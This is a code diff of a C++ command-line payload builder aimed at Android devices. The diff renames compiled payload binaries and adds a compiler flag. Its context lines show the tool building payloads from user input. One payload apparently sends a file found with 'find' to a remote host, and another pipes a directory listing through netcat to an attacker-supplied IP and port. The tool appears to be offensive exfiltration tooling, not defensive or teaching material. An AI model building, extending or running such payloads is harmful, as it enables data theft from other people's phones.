@@ -3,7 +3,7 @@
 
 using namespace std;
 
-const string TOOLCHAIN = "./toolchain/bin/arm-linux-androideabi-clang++";
+const string TOOLCHAIN = "./toolchain/bin/arm-linux-androideabi-clang++ -fPIE";
 const string TARGET_BASH = "/system/bin/sh";
 const string OPTIONS = "Options: \n"
                         "    1) Execute single command\n"
@@ -31,7 +31,7 @@ int main(){
                 config_file.open("payload1_config.h");
                 config_file << "std::string command = \"" << command << "\";";
                 config_file.close();
-                sys_call = TOOLCHAIN + " ./payload1.cpp -o payload";
+                sys_call = TOOLCHAIN + " ./payload1.cpp -o payload1";
                 system(sys_call.c_str());
                 break;
             case '2':
@@ -49,7 +49,7 @@ int main(){
                                 + "< $(find / -name '" + retrieval_filename
                                 + "' 2>/dev/null)\";";
                 config_file.close();
-                sys_call = TOOLCHAIN + " ./payload2.cpp -o payload";
+                sys_call = TOOLCHAIN + " ./payload2.cpp -o payload2";
                 system(sys_call.c_str());
                 break;
             case '3':
@@ -59,7 +59,7 @@ int main(){
                 config_file << "std::string command = \"ls -la " + path
                                 + " | nc " + ip + " " + port + "\";";
                 config_file.close();
-                sys_call = TOOLCHAIN + " ./payload3.cpp -o payload";
+                sys_call = TOOLCHAIN + " ./payload3.cpp -o payload3";
                 system(sys_call.c_str());
                 break;
             case '4':
@@ -73,7 +73,7 @@ int main(){
                 config_file.open("payload4_config.h");
                 config_file << "std::string command = \"" << command << "\";";
                 config_file.close();
-                sys_call = TOOLCHAIN + " ./payload4.cpp -o payload";
+                sys_call = TOOLCHAIN + " ./payload4.cpp -o payload4";
                 system(sys_call.c_str());
                 break;
             case '5':
